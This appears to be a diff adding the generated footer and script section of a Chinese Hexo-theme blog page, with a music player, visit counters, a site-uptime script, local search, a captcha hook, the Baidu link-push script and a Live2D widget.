+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+           
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2021";
+                        var startMonth = "11";
+                        var startDate = "28";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script></body>
+
+</html>
